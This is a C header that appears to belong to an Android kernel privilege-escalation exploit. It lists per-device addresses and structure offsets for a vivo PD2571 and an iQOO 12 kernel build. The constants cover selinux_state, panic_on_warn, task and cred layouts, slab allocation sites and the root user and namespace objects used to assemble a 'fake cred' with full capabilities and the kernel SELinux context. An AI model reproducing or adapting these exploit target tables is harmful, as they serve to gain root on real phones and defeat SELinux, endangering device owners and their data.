#ifndef IC_PROFILES_H
#define IC_PROFILES_H

/*
 * Per-build constants for the 98260 core.
 *
 * Select exactly one profile at compile time:
 *     -DIC_PROFILE_PD2571        (default) vivo PD2571, 6.1.145
 *     -DIC_PROFILE_QEMU_IQOO12   iQOO 12 / PD2307 16.2.11 Image under QEMU
 *
 * How each group is derived (see core/README.md):
 *   static addresses  embedded kallsyms of the extracted Image (link-time,
 *                     i.e. _text is 0xffffffc008000000)
 *   call-site low21   disassemble the Image: return address of the
 *                     kmem_cache_alloc(_node) call in the allocation path
 *   struct offsets    BTF of the Image (/sys/kernel/btf/vmlinux or the
 *                     .BTF blob inside the Image)
 *   tracefs ids       never hardcoded; discovered at run time
 */

#if !defined(IC_PROFILE_PD2571) && !defined(IC_PROFILE_QEMU_IQOO12)
#define IC_PROFILE_PD2571 1
#endif

#if defined(IC_PROFILE_QEMU_IQOO12)

/* iQOO 12 / PD2307, 6.1.145-android14-11-maybe-dirty (16.2.11 boot.img),
 * locally booted with qemu-system-aarch64 -M virt.  All values below were
 * re-derived from testdata/download_kernel.Image itself. */
#define IC_PROFILE_NAME "qemu-iqoo12-6.1.145"
#define PROFILE_KERNEL_MATCH "6.1.145-android14"

/* do_timer_create: posix_timers_cache alloc, return site 0x1a12ac. */
#define STATIC_TIMER_SITE 0xffffffc0081a12acULL
#define TIMER_SITE_LOW21 0x1a12acULL
#define TIMER_ALLOC 0x108ULL

/* cred_jar: measured at run time: object_size=184 (0xb8) and
 * slab_size=192 (0xc0).  The Image's embedded BTF says 176, which is the
 * GKI base layout; this build's cred has an extra 8-byte tail (prepare_creds
 * copies 0xb0 then stores one more qword at +0xb0).  uid is still at +4 and
 * user at +0x80 (confirmed in __sys_setuid), so only the cache size differs. */
#define CRED_REQ 0xb8ULL
#define CRED_ALLOC 0xc0ULL

/* Link-time addresses from the embedded kallsyms. */
#define SELINUX_STATE_STATIC 0xffffffc00a47fb98ULL
#define PANIC_ON_WARN_STATIC 0xffffffc00a0fae08ULL
#define CRED_UID_OFF 0x4ULL /* offsetof(struct cred, uid) */

/* task_struct layout (BTF id 608, size 5376). */
#define OFF_TASK_CRED 0x838ULL
#define COPY_PROCESS_LOW21 0xad8d4ULL /* dup_task_struct alloc return site */
#define TASK_ALLOC_BYTES 0x1500ULL
#define FULLCAP 0x1ffffffffffULL

/* cred internal offsets (BTF id 739, size 176). */
#define OFF_CRED_CAP_INH 0x28ULL
#define OFF_CRED_CAP_PERM 0x30ULL
#define OFF_CRED_CAP_EFF 0x38ULL
#define OFF_CRED_CAP_BSET 0x40ULL
#define OFF_CRED_CAP_AMB 0x48ULL
#define OFF_CRED_SECURITY 0x78ULL
#define OFF_CRED_USER 0x80ULL
#define OFF_CRED_USER_NS 0x88ULL
#define OFF_CRED_UCOUNTS 0x90ULL
#define OFF_CRED_GROUP_INFO 0x98ULL

/* Link-time symbols for the fake cred's refcounted sub-objects. */
#define ROOT_USER_STATIC 0xffffffc00a121108ULL
#define INIT_USER_NS_STATIC 0xffffffc00a120e70ULL
#define INIT_UCOUNTS_STATIC 0xffffffc00a1229b8ULL
#define INIT_GROUPS_STATIC 0xffffffc00a122428ULL
#define SELINUX_BLOB_OFF 0x0ULL
#define SELINUX_SID_KERNEL 1U

/* Second compatible site slot; this image has a single alloc path. */
#define STATIC_TIMER_SITE_2 0xffffffc0081a12acULL
#define TIMER_SITE_LOW21_2 0x1a12acULL
#define COPY_PROCESS_LOW21_2 0xad8d4ULL

/* __tracepoint_sys_exit (vr.ko de-tag target; absent on QEMU, harmless). */
#define TP_STATIC 0xffffffc00a2f3680ULL
#define TP_FUNCS_OFF 0x40ULL

#elif defined(IC_PROFILE_PD2571)

/* vivo PD2571, 6.1.145-android14-11-maybe-dirty (reference device of the
 * upstream port this core was vendored from). */
#define IC_PROFILE_NAME "pd2571-6.1.145"
#define PROFILE_KERNEL_MATCH "6.1.145-android14"

#define STATIC_TIMER_SITE 0xffffffc0081a1a0cULL
#define TIMER_SITE_LOW21 0x1a1a0cULL
#define TIMER_ALLOC 0x108ULL

#define CRED_REQ 0xb8ULL
#define CRED_ALLOC 0xc0ULL

#define SELINUX_STATE_STATIC 0xffffffc00a55a4f0ULL
#define PANIC_ON_WARN_STATIC 0xffffffc00a1cae08ULL
#define CRED_UID_OFF 0x8ULL

#define OFF_TASK_CRED 0x838ULL
#define COPY_PROCESS_LOW21 0xad8d4ULL
#define TASK_ALLOC_BYTES 0x1500ULL
#define FULLCAP 0x1ffffffffffULL

#define OFF_CRED_CAP_INH 0x2cULL
#define OFF_CRED_CAP_PERM 0x34ULL
#define OFF_CRED_CAP_EFF 0x3cULL
#define OFF_CRED_CAP_BSET 0x44ULL
#define OFF_CRED_CAP_AMB 0x4cULL
#define OFF_CRED_SECURITY 0x78ULL
#define OFF_CRED_USER 0x80ULL
#define OFF_CRED_USER_NS 0x88ULL
#define OFF_CRED_UCOUNTS 0x90ULL
#define OFF_CRED_GROUP_INFO 0x98ULL

#define ROOT_USER_STATIC 0xffffffc00a1f1208ULL
#define INIT_USER_NS_STATIC 0xffffffc00a1f0f70ULL
#define INIT_UCOUNTS_STATIC 0xffffffc00a1f2ab8ULL
#define INIT_GROUPS_STATIC 0xffffffc00a1f2528ULL
#define SELINUX_BLOB_OFF 0x0ULL
#define SELINUX_SID_KERNEL 1U

#define STATIC_TIMER_SITE_2 0xffffffc0081a1a0cULL
#define TIMER_SITE_LOW21_2 0x1a1a0cULL
#define COPY_PROCESS_LOW21_2 0xad8d4ULL

#define TP_STATIC 0xffffffc00a3c9ec0ULL
#define TP_FUNCS_OFF 0x40ULL

#endif

#endif /* IC_PROFILES_H */
